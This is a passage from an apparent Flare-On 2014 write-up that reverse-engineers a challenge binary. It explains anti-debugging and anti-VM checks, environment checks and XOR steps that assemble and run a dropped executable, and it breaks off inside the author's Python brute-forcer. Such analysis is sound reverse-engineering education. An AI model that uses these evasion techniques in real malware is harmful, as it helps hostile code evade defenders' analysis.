.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

![OutputDebugString](/images/2014/flare/7-10.jpg "OutputDebugString")

This is almost the same as listing 16-1 in page 353 of ``Practical Malware Analysis`` book ([Link to p.353 on Google Books](http://books.google.com/books?id=FQC8EPYy834C&pg=PA353&dq=outputdebugstring&hl=en&sa=X&ei=lcksVI7JM9bGsQSdpoGACA&ved=0CDsQ6AEwBQ#v=onepage&q=outputdebugstring&f=false)). First the current error code is set to ``0x1234``. Then ``OutputDebugString`` is called with string ``bah!``. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains ``0x1234``. Later, last error code is retrieved by calling ``GetLastError``, if this value is not changed then a debugger is attached to the application and string ``Sandboxes are fun to play in`` is xor-ed with blob. In the absence of a debugger, ``I'm gonna sandbox your face`` is used.

{{< codecaption lang="nasm" title="OutputDebugString" >}}
if(debugger_is_attached):
    blob = xor(blob,"Sandboxes are fun to play in")
else:
    blob = xor(blob, "I'm gonna sandbox your face")
{{< /codecaption >}}

#### Function 6 - I Can Haz Breakpoint?

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    sub_401350       ; you are here
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

![0xCC Check](/images/2014/flare/7-11.jpg "0xCC Check")

Offsets from two functions are loaded and then compared. The first one calls ``isDebuggerPresent`` and the second one just prints something and exits. We have seen this function before, it is the first check.

{{< codecaption lang="nasm" title="calls_isDebuggerPresent" >}}
01030 calls_isDebuggerPresent proc near
.text:00401030 push    esi
.text:00401031 call    ds:IsDebuggerPresent
.text:00401037 mov     esi, blob_length
.text:0040103D xor     ecx, ecx
.text:0040103F test    eax, eax
.text:00401041 jz      short loc_401079
{{< /codecaption >}}

{{< codecaption lang="nasm" title="sub_401780" >}}
.text:00401780 sub_401780 proc near
.text:00401780
.text:00401780 arg_0= dword ptr  8
.text:00401780
.text:00401780 push    ebp
.text:00401781 mov     ebp, esp
.text:00401783 mov     eax, [ebp+arg_0]
.text:00401786 push    eax
.text:00401787 push    offset aBmoChopD ; "BMO Chop! [%d]\n"
.text:0040178C call    _printf
.text:00401791 add     esp, 8
.text:00401794 push    0FFFFDCD7h      ; uExitCode
.text:00401799 call    ds:ExitProcess
.text:00401799 sub_401780 endp
{{< /codecaption >}}

None of these functions are called. But their offsets are compared. If offset of ``calls_isDebuggerPresent`` is larger than ``sub_401780`` then we jump down and string ``I can haz decode?`` is xor-ed with the blob. Otherwise we go right. **I am not quite sure what this check is for**. I think it is trying to find if calls to ``isDebuggerPresent`` are redirected or not (by the debugger?) as the address of the first function is ``0x401030`` and is smaller than ``0x401780``. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.

To the right we can see a pretty standard ``0xCC`` check. ``0xCC`` is the code for ``INT 3`` and is used by debuggers to set breakpoints. It is simply checking if ``0xCC`` bytes are present in the function code. If ``0xCC`` is present ``ecx`` is increased by 2, otherwise by one. In the end this number is compared with ``0x55``. If the check does not pass it will jump to left (same as above) and ``I can haz decode?`` is xor-ed with the blob. If the number is ``0x55`` string ``Such fire. Much burn. Wow.`` is xor-ed with the blob.

{{< codecaption lang="python" title="ICanHaz?" >}}
if (calls_isDebuggerPresent.address > sub_401780.address) or (calls_isDebuggerPresent.has0xCC == True ):
    blob = xor(blob,"I can haz decode?")
else:
    blob = xor(blob,"Such fire. Much burn. Wow.")
{{< /codecaption >}}


#### Function 7 - NtGlobalFlag

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    ICanHaz?
.text:00401B31 call    sub_4013F0       ; you are here
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

This one is pretty straightforward. A field inside the ``PEB`` (we have already seen it) is called ``NtGlobalFlag``. This flag is at offset ``0x68`` in 32-bit versions of Windows (and ``0xBC`` for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to ``0x70``. To read more about it, please look at the [Anti-Debugging](http://pferrie.host22.com/papers/antidebug.pdf) reference.

!["NtGlobalFlag Checked"](/images/2014/flare/7-12.jpg "NtGlobalFlag Checked")

If ``NtGlobalFlag`` is not ``0x70`` then ``\x09\x00\x00\x01`` will be xor-ed with the blob, otherwise ``Feel the sting of the monarch!``.

{{< codecaption lang="python" title="NtGlobalFlag" >}}
if (NtGlobalFlag == 0x70):
    blob = xor(blob,"Feel the sting of the monarch!")

else:
    blob = xor(blob,"\x09\x00\x00\x01")
{{< /codecaption >}}

#### Function 8 - Sands of Time

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    ICanHaz?
.text:00401B31 call    NtGlobalFlag
.text:00401B36 call    sub_401460     ; you are here
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

![Checking day of the week](/images/2014/flare/7-13.jpg "Checking day of the week")

This is not a countermeasure but a simple check. First ``time64`` is called and returns the number of seconds since January 1st 1970. Then ``localtime64`` converts it to [readabled format](http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx) stored in a structure of type ``tm`` according to MSDN:

{{< codecaption lang="cpp" title="tm" >}}
// each field is an int (4 bytes)

tm_sec:     Seconds after minute (0 – 59)
tm_min:     Minutes after hour (0 – 59)
tm_hour:    Hours after midnight (0 – 23)
tm_mday:    Day of month (1 – 31)
tm_mon:     Month (0 – 11; January = 0)
tm_year:    Year (current year minus 1900)
tm_wday:    Day of week (0 – 6; Sunday = 0) : offset: 24
tm_yday:    Day of year (0 – 365; January 1 = 0)
tm_isdst:   Positive value if daylight saving time is in effect; 0 if daylight saving time is not in effect; negative value if status of daylight saving time is unknown

{{< /codecaption >}}

Next instruction ``cmp dword ptr [eax+18h], 5`` compares 24th (0x16) byte of the structure with 5. Because each field is of type ``int`` and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor ``! 50 1337`` with the blob and if it is not Friday blob will be xor-ed with ``1337``.

{{< codecaption lang="python" title="Day of the week check" >}}
if (Friday):
    blob = xor(blob,"! 50 1337")
else:
    blob = xor(blob,"1337")
{{< /codecaption >}}

#### Function 9 - Backdoge.exe

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    ICanHaz?
.text:00401B31 call    NtGlobalFlag
.text:00401B36 call    SandsOfTime
.text:00401B3B mov     eax, [esi]   ; eax = executable's name
.text:00401B3D call    sub_4014F0   ; you are here
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

Before next function, executable's complete path is saved into ``eax``. Then ``sub_4014F0`` is called.

![Comparing executable's name with backdoge.exe](/images/2014/flare/7-14.jpg "Comparing executable's name with backdoge.exe")

Again, this is just a check. Executable's name is compared with ``backdoge.exe`` two characters in each iteration.

![Filename check](/images/2014/flare/7-15.jpg "Filename check")

The rest is pretty easy. If filename check passes, ``MATH IS HARD`` will be xor-ed with the blob and if not ``LETS GO SHOPPING``.

{{< codecaption lang="python" title="Filename check" >}}
if (filename == "BackDoge.exe"):
    blob = xor(blob,"MATH IS HARD")
else:
    blob = xor(blob,"LETS GO SHOPPING")
{{< /codecaption >}}

#### Function 10 - Dogecoin.com IP Check

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    ICanHaz?
.text:00401B31 call    NtGlobalFlag
.text:00401B36 call    SandsOfTime
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    BackDoge
.text:00401B42 call    sub_401590   ; you are here
.text:00401B47 call    sub_4016F0
{{< /codecaption >}}

Another check. This time the application retrieves the IP for ``www.dogecoin.com`` using [gethostbyname](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx). The result is of the form [hostent](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx):

{{< codecaption lang="cpp" title="hostent structure (for Win32)" >}}
typedef struct hostent {
  char FAR      *h_name;        // index: 0
  char FAR  FAR **h_aliases;    // index: 4
  short         h_addrtype;     // index: 8
  short         h_length;       // index: 9
  char FAR  FAR **h_addr_list;
} HOSTENT, *PHOSTENT, FAR *LPHOSTENT;
{{< /codecaption >}}

![Dogecoin.com IP](/images/2014/flare/7-16.jpg "Dogecoin.com IP")

Then 8th byte will be compared with ``2`` which is ``h_addrtype``. According to this [stackoverflow answer](http://stackoverflow.com/q/2549461), it is ``AF_INET`` or ``PF_INET`` defined in [bits/socket.h](http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html).

``inet_ntoa`` is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to ``127.0.0.1`` two characters at a time like last check.

![xor paths for ip check](/images/2014/flare/7-17.jpg "xor paths for ip check")

The xor-string is ``LETS GO MATH`` if the resolved IP address is not ``127.0.0.1``. If the IP address is ``127.0.0.1`` or ``h_addrtype`` is not ``2`` then ``SHOPPING IS HARD`` will be xor-ed with the blob.

{{< codecaption lang="python" title="Dogecoin.com IP check" >}}
if (h_addrtype != 2 or (Dogecoin_ip == "127.0.0.1")):
    blob = xor(blob,"SHOPPING IS HARD")
if (Dogecoin_ip != "127.0.0.1"):
    blob = xor(blob,"LETS GO MATH")
{{< /codecaption >}}

#### Function 11 - Hour of the Wolf

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    OutputDebugString
.text:00401B2C call    ICanHaz?
.text:00401B31 call    NtGlobalFlag
.text:00401B36 call    SandsOfTime
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    BackDoge
.text:00401B42 call    IPCheck
.text:00401B47 call    sub_4016F0   ; you are here
{{< /codecaption >}}

![Hour check](/images/2014/flare/7-18.jpg "Hour check")

Again, we see the familiar ``time64`` and ``localtime64`` calls. This time offset 8 of the ``tm`` structure (copied below) is compared with ``0x11`` or ``17``. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.

{{< codecaption lang="cpp" title="tm" >}}
// each field is an int (4 bytes)

tm_sec:     Seconds after minute (0 – 59).  ; index: 0
tm_min:     Minutes after hour (0 – 59).    ; index: 4
tm_hour:    Hours after midnight (0 – 23).  ; index: 8
tm_mday:    Day of month (1 – 31).
tm_mon:     Month (0 – 11; January = 0).
tm_year:    Year (current year minus 1900).
tm_wday:    Day of week (0 – 6; Sunday = 0).
tm_yday:    Day of year (0 – 365; January 1 = 0).
tm_isdst:   Positive value if daylight saving time is in effect; 0 if daylight saving time is not in effect; negative value if status of daylight saving time is unknown.

{{< /codecaption >}}

If time check passes, blob is xor-ed with ``\x01\x02\x03\x05\x00\x78\x30\x38\x0d`` otherwise it will be xor-ed with ``\x07\x77``.

{{< codecaption lang="python" title="Hour check" >}}
if (Hour == 17)):   # Between 5 and 6 PM
    blob = xor(blob,"\x01\x02\x03\x05\x00\x78\x30\x38\x0d")
else:
    blob = xor(blob,"\x07\x77")
{{< /codecaption >}}

#### Interlude - 12 - Fullpath xor

{{< codecaption lang="nasm" >}}
.text:00401B3D call    BackDoge
.text:00401B42 call    IPCheck
.text:00401B47 call    HourCheck
.text:00401B4C mov     ebx, blob_length ; you are here
.text:00401B52 mov     edi, [esi]
.text:00401B54 xor     ecx, ecx
.text:00401B56 test    ebx, ebx
.text:00401B58 jz      short loc_401B83
.text:00401B5A lea     ebx, [ebx+0]
.text:00401B60
.text:00401B60 loc_401B60:                             ; CODE XREF: .text:00401B81j
.text:00401B60 mov     eax, 0AAAAAAABh
.text:00401B65 mul     ecx
.text:00401B67 shr     edx, 3
.text:00401B6A lea     eax, [edx+edx*2]
.text:00401B6D add     eax, eax
.text:00401B6F add     eax, eax
.text:00401B71 mov     edx, ecx
.text:00401B73 sub     edx, eax
.text:00401B75 mov     al, [edx+edi]    ; Moving full path to al by character
.text:00401B78 xor     blob[ecx], al    ; xor-ing full path with blob
.text:00401B7E inc     ecx
.text:00401B7F cmp     ecx, ebx
.text:00401B81 jb      short loc_401B60 ; jump back up to xor the next char
.text:00401B83
.text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
.text:00401B83 call    sub_4017A0
.text:00401B88 call    sub_4018A0
{{< /codecaption >}}

We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, **keep in mind that one of the checks compared full path with ``backdoge.exe``**.

{{< codecaption lang="python" title="Fullpath xor" >}}
blob = xor(blob, fullpath)
{{< /codecaption >}}


#### Function 13 - Internet Rootz

{{< codecaption lang="nasm" >}}
.text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
.text:00401B83 call    sub_4017A0       ; you are here
.text:00401B88 call    sub_4018A0
.text:00401B8D mov     ecx, [esi+4]
.text:00401B90 movzx   edx, byte ptr [ecx]
.text:00401B93 mov     blob, dl
{{< /codecaption >}}

Two more functions. We're getting there.

![Fetching IP for e.root-servers.net](/images/2014/flare/7-19.jpg "Fetching IP for e.root-servers.net")

We have seen this type of code. This function pushes ``e.root-servers.net`` to stack and then calls ``gethostbyname`` to retrieve its IP ``192.203.230.10``. If the result is not zero, ``h_addrtype`` is checked for 2 (``AF_INET``) and retrieved IP is converted into ASCII format.

![xor-ing IP with blob](/images/2014/flare/7-20.jpg "xor-ing IP with blob")

The rest is pretty simple. ``192.203.230.10`` is xor-ed with the blob.

{{< codecaption lang="python" title="Fullpath xor" >}}
blob = xor(blob,"192.203.230.10")
{{< /codecaption >}}

#### Function 14 - jackRAT

{{< codecaption lang="nasm" >}}
.text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
.text:00401B83 call    InternetRootz
.text:00401B88 call    sub_4018A0       ; you are here
.text:00401B8D mov     ecx, [esi+4]
.text:00401B90 movzx   edx, byte ptr [ecx]
.text:00401B93 mov     blob, dl
{{< /codecaption >}}

{{< codecaption lang="nasm" title="sub_4018A0" >}}

.text:004018A0 sub_4018A0 proc near
.text:004018A0
.text:004018A0 push    ebp
.text:004018A1 mov     ebp, esp
.text:004018A3 mov     eax, 1088h
.text:004018A8 call    __alloca_probe
.text:004018AD mov     eax, ___security_cookie
.text:004018B2 xor     eax, ebp
.text:004018B4 mov     [ebp+var_4], eax
.text:004018B7 push    ebx
.text:004018B8 xor     ebx, ebx
.text:004018BA push    ebx             ; dwFlags - 0x00
.text:004018BB push    ebx             ; lpszProxyBypass - 0x00
.text:004018BC push    ebx             ; lpszProxy - 0x00
.text:004018BD push    1               ; dwAccessType - INTERNET_OPEN_TYPE_DIRECT
.text:004018BD                         ; Meaning direct access
.text:004018BF push    offset szAgent  ; "ZBot"
.text:004018C4 call    ds:InternetOpenW
.text:004018CA mov     [ebp+var_1088], eax
.text:004018D0 cmp     eax, ebx          ; If a NULL handle is returned (no internet connectivity) exit
.text:004018D2 jnz     short loc_4018E5  ; otherwise jump to loc_4018E5
.text:004018D4 xor     eax, eax
.text:004018D6 pop     ebx
.text:004018D7 mov     ecx, [ebp+var_4]
.text:004018DA xor     ecx, ebp
.text:004018DC call    @__security_check_cookie@4 ; __security_check_cookie(x)
.text:004018E1 mov     esp, ebp
.text:004018E3 pop     ebp             ; exit if NULL handle was retured
.text:004018E4 ret
{{< /codecaption >}}

We see [InternetOpen](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx) called. This function initialises the WinINet functions. Agent name is ``ZBot`` which is an alternate name for the ``Zeus`` trojan horse. Access type is ``INTERNET_OPEN_TYPE_DIRECT`` which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to ``loc_4018E5`` (line 21).

{{< codecaption lang="nasm" title="loc 4018E5 - InternetOpenUrl" >}}
.text:004018E5 loc_4018E5:             ; dwContext
.text:004018E5 push    ebx
.text:004018E6 push    400100h         ; dwFlags
.text:004018EB push    ebx             ; dwHeadersLength - 0x00
.text:004018EC push    ebx             ; lpszHeaders - 0x00
.text:004018ED lea     ecx, [ebp+szUrl]
.text:004018F0 push    ecx             ; lpszUrl
.text:004018F1 push    eax             ; hInternet - Handle from previous InternetOpen
.text:004018F2 mov     dword ptr [ebp+szUrl], 740068h
.text:004018F9 mov     [ebp+var_78], 700074h
.text:00401900 mov     [ebp+var_74], 3A0073h
.text:00401907 mov     [ebp+var_70], 2F002Fh
.text:0040190E mov     [ebp+var_6C], 770074h
.text:00401915 mov     [ebp+var_68], 740069h
.text:0040191C mov     [ebp+var_64], 650074h
.text:00401923 mov     [ebp+var_60], 2E0072h
.text:0040192A mov     [ebp+var_5C], 6F0063h
.text:00401931 mov     [ebp+var_58], 2F006Dh
.text:00401938 mov     [ebp+var_54], 690046h
.text:0040193F mov     [ebp+var_50], 650072h
.text:00401946 mov     [ebp+var_4C], 790045h
.text:0040194D mov     [ebp+var_48], 2F0065h
.text:00401954 mov     [ebp+var_44], 740073h
.text:0040195B mov     [ebp+var_40], 740061h
.text:00401962 mov     [ebp+var_3C], 730075h
.text:00401969 mov     [ebp+var_38], 34002Fh
.text:00401970 mov     [ebp+var_34], 340038h
.text:00401977 mov     [ebp+var_30], 330030h
.text:0040197E mov     [ebp+var_2C], 350033h
.text:00401985 mov     [ebp+var_28], 350031h
.text:0040198C mov     [ebp+var_24], 330035h
.text:00401993 mov     [ebp+var_20], 310038h
.text:0040199A mov     [ebp+var_1C], 360031h
.text:004019A1 mov     [ebp+var_18], 300036h
.text:004019A8 mov     [ebp+var_14], 38h   ; https://twitter.com/FireEye/status/484033515538116608
.text:004019AF call    ds:InternetOpenUrlW ; open URL
.text:004019B5 mov     [ebp+hInternet], eax
.text:004019BB cmp     eax, ebx        ; ebx == 0x00 - check if eax is zero
.text:004019BD jz      loc_4018D4      ; if (eax == 0 ) jump to loc_4018D4 (return immedi
{{< /codecaption >}}

[InternetOpenUrl](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx) opens a handle to a resource. ``dwFlags`` is set to ``0x00400100``. I could not find the exact meaning of this flag value. However, according to [this page](http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx) it could be the ``OR`` of two flags (does it work that way?):

{{< codecaption lang="powershell" title="0x00400100 flag" >}}

INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
Uses keep-alive semantics, if available, for the connection.

INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
Forces the request to be resolved by the origin server.

{{< /codecaption >}}

Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is ``https://twitter.com/FireEye/status/484033515538116608``.

<!-- ![Fireeye tweet](/images/2014/flare/7-2.jpg "Fireeye tweet") -->

{{< tweet 484033515538116608 >}}

Line 37 saves return value which is a "valid handle to the URL if the connection is successfully established, or NULL if the connection fails". Then it is checked for being NULL, if so we will jump to ``loc_4018D4`` and function returns immediately. If we have a handle to the tweet, execution continues.

{{< codecaption lang="nasm" title="loc 4019D6 - InternetReadFile" >}}
.text:004019D6 loc_4019D6:
.text:004019D6 lea     edx, [ebp+dwNumberOfBytesRead]
.text:004019DC push    edx             ; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read
.text:004019DD push    1000h           ; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096
.text:004019E2 lea     ecx, [ebp+Buffer]
.text:004019E8 push    ecx             ; lpBuffer - Buffer to hold the retrieved data
.text:004019E9 push    eax             ; hFile - Handle from previous InternetOpenUrl call
.text:004019EA call    ds:InternetReadFile ; Reading the first 4KBs of the tweet
.text:004019F0 mov     edx, [ebp+dwNumberOfBytesRead]
.text:004019F6 lea     eax, [edi+edx]
.text:004019F9 push    eax             ; size_t
.text:004019FA call    ??2@YAPAXI@Z    ; operator new(uint)
.text:004019FF push    edi             ; size_t
.text:00401A00 mov     esi, eax
.text:00401A02 push    ebx             ; void *
.text:00401A03 push    esi             ; void *
.text:00401A04 call    _memcpy
.text:00401A09 mov     ecx, [ebp+dwNumberOfBytesRead]
.text:00401A0F push    ecx             ; size_t
.text:00401A10 lea     edx, [ebp+Buffer]
.text:00401A16 push    edx             ; void *
.text:00401A17 lea     eax, [esi+edi]
.text:00401A1A push    eax             ; void *
.text:00401A1B call    _memcpy         ; Copy retrieved data to [eax]
.text:00401A20 push    ebx             ; void *
.text:00401A21 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401A26 mov     eax, [ebp+dwNumberOfBytesRead]
.text:00401A2C add     esp, 20h
.text:00401A2F add     edi, eax
.text:00401A31 mov     ebx, esi
.text:00401A33 test    eax, eax         ; Keep reading until NumberofBytesRead is zero
.text:00401A35 jnz     short loc_4019D0 ; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading

.text:004019D0 loc_4019D0:
.text:004019D0 mov     eax, [ebp+hInternet] ; Back to the top to continue reading
{{< /codecaption >}}

[InternetReadFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx) retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says "[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero." This is happening in lines 31-35. We keep reading until ``NumberofBytesRead`` is zero.

After we are done, the jump in line 32 is not taken and we land here:

![Sifting through the tweet](/images/2014/flare/7-21.jpg "Sifting through the tweet")

We retrieved the tweet. Now [strstr](http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx) is called to find the first instance of ``Secluded Hi`` in the tweet. The return value is a pointer to the start of ``Secluded HijackRAT http://t.co/ckx18JHdkb ...``. The application adds ``0x0B`` or 11 to the start of the string to skip ``Secluded Hi`` and point to ``jackRAT http://t.co/ckx18JHdkb ...``. A new 8 character buffer is created and passed to [strncpy](http://msdn.microsoft.com/en-us/library/xdsywd25.aspx). ``strncpy`` is called to copy 7 bytes from the start to the newly created buffer which will be ``jackRAT``. The rest is simple, ``jackRAT`` is xor-ed with the blob and finally [InternetCloseHandle](http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx) is called three times to close the three function calls.

![xor(blob,"jackRAT")](/images/2014/flare/7-22.jpg "xor(blob,"jackRAT")

{{< codecaption lang="python" title="jackRAT xor" >}}
blob = xor(blob,"jackRAT")
{{< /codecaption >}}

### Are we there yet? gratz but not yet

{{< codecaption lang="nasm" >}}
.text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
.text:00401B83 call    InternetRootz
.text:00401B88 call    jackRAT
.text:00401B8D mov     ecx, [esi+4]          ; you are here
.text:00401B90 movzx   edx, byte ptr [ecx]   ; application crashes here if no arguments are provided
.text:00401B93 mov     blob, dl              ; blob[0] = arg1[0]; first character of arg1 written to blob
.text:00401B99 mov     eax, [esi+4]
.text:00401B9C mov     cl, [eax+1]           ; cl = arg1[1]; second character of arg1
.text:00401B9F mov     byte_4131F9, cl       ; blob[1] = arg1[1];
.text:00401BA5 mov     edx, [esi+8]          ; edx = *(arg2);
.text:00401BA8 mov     al, [edx]             ; al = arg2[0];
.text:00401BAA mov     byte_413278, al       ; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F
.text:00401BAF mov     ecx, [esi+8]          ; ecx = *(arg2);
.text:00401BB2 movzx   edx, byte ptr [ecx+1] ; edx = arg2[1];
.text:00401BB6 lea     eax, [ebp-10h]
.text:00401BB9 push    offset aWb            ; mode: "wb" - write in binary mode
.text:00401BBE push    eax                   ; push current path
.text:00401BBF mov     byte_413279, dl       ; blob[0x81] = arg2[1];
.text:00401BC5 mov     dword ptr [ebp-10h], 74617267h
.text:00401BCC mov     dword ptr [ebp-0Ch], 78652E7Ah
.text:00401BD3 mov     word ptr [ebp-8], 65h ; "gratz.exe" saved in [ebp-10]
.text:00401BD9 call    _fopen                ; fopen(filename="currentpath\gratz.exe",mode="wb"); Open if exists and if not create it

.text:00401BDE mov     ecx, blob_length
.text:00401BE4 mov     esi, eax              ; *(gratz.exe)
.text:00401BE6 push    esi                   ; FILE = *(gratz.exe)
.text:00401BE7 push    ecx                   ; size = blob length
.text:00401BE8 push    1                     ; count = 1
.text:00401BEA push    offset blob           ; buffer = *(blob)
.text:00401BEF call    _fwrite               ; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe

.text:00401BF4 push    esi                   ; push *(gratz.exe)
.text:00401BF5 call    _fclose               ; fclose( *(gratz.exe) ); Close gratz.exe

.text:00401BFA lea     edx, [ebp-10h]        ; edx = "gratz.exe"
.text:00401BFD push    edx
.text:00401BFE call    _system               ; system("gratz.exe"); Execute gratz.exe
.text:00401C03 mov     ecx, [ebp-4]

{{< /codecaption >}}

The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application's complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset ``0x80`` and ``0x81``.

Then [fopen](http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx) is called to create/open a file named ``gratz.exe`` for writing in binary mode ("wb"). Then blob is written to it by calling [fwrite](http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx) and finally it is closed with [fclose](http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx). Then command ``gratz.exe`` is run via the [system](http://msdn.microsoft.com/en-us/library/277bwbdz.aspx) call. So we are writing the blob to a file and then executing it.

What is special about first two bytes in a Windows binary? It's the start of the DOS stub with the magic bytes ``MZ`` and you have already guessed that the second argument should be ``PE``.

### How do I XOR?

But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to ``00401B8D`` and step through after the breakpoint. Stop before the ``system`` call and copy the ``gratz.exe`` file from disk.

Here's my bruteforcer. This is not good code but at that point I just wanted to finish.

{{< codecaption lang="python" title="bruteforcer" >}}

key1={}
key1[0]='oh happy dayz'
key1[1]='the final countdown'

key2={}
key2[0]='UNACCEPTABLE!'
key2[1]='omglob'

key3={}
key3[0]='you\x27re so good'
key3[1]='you\x27re so bad'

key4={}
key4[0]='\x66'
key4[1]='\x01'

key5={}
key5[0]='Sandboxes are fun to play in'
key5[1]='I\x27m gonna sandbox your face'

key6={}
key6[0]='I can haz decode?'
key6[1]='Such fire. Much burn. Wow.'

key7={}
key7[0]='\x09\x00\x00\x01'
key7[1]='Feel the sting of the Monarch!'

key8={}
key8[0]='! 50 1337'
key8[1]='1337'

key9={}
key9[0]='LETS GO SHOPPING'
key9[1]='MATH IS HARD'

key10={}
key10[0]='LETS GO MATH'
key10[1]='SHOPPING IS HARD'

key11={}
key11[0]='\x01\x02\x03\x05\x00\x78\x30\x38\x0d'
key11[1]='\x07\x77'

key12={}
key12[0]="backdoge.exe"
key12[1]="\x00"

key13={}
key13[0]='192.203.230.10'
key13[1]='\x00'

key14={}
key14[0]='\x00'
key14[1]='jackRAT'

index={}
for i in xrange(15):
    index[i] = 0


# we want this to support variable length keys
# so if the key is smaller than data, it will wrap around
def xor(mydata,mykey):
    keylen = len(mykey)
    datalen = len(mydata)

    # easier to just extend the key array, but probably not that memory efficient
    # not that we care about it here ;)
    key = mykey * ( (datalen/keylen)+1 )

    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(mydata,key))


from binascii import hexlify, unhexlify

myfile = file('c:\\extractedgratz.exe','rb')

wholefile = myfile.read()

out = wholefile[:0x10]

myfile.close()


counter = 0

for index[1] in xrange(2):
  for index[2] in xrange(2):
    for index[3] in xrange(2):
      for index[4] in xrange(2):
        for index[5] in xrange(2):
          for index[6] in xrange(2):
            for index[7] in xrange(2):
              for index[8] in xrange(2):
                for index[9] in xrange(2):
                  for index[10] in xrange(2):
                    for index[11] in xrange(2):
                      for index[12] in xrange(2):
                        for index[13] in xrange(2):
                          for index[14] in xrange(2):
                            out = xor(out,key1[index[1]])
                            out = xor(out,key2[index[2]])
                            out = xor(out,key3[index[3]])
                            out = xor(out,key4[index[4]])
                            out = xor(out,key5[index[5]])
                            out = xor(out,key6[index[6]])
                            out = xor(out,key7[index[7]])
                            out = xor(out,key8[index[8]])
                            out = xor(out,key9[index[9]])
                            out = xor(out,key10[index[10]])
                            out = xor(out,key11[index[11]])
                            out = xor(out,key12[index[12]])
                            out = xor(out,key13[index[13]])
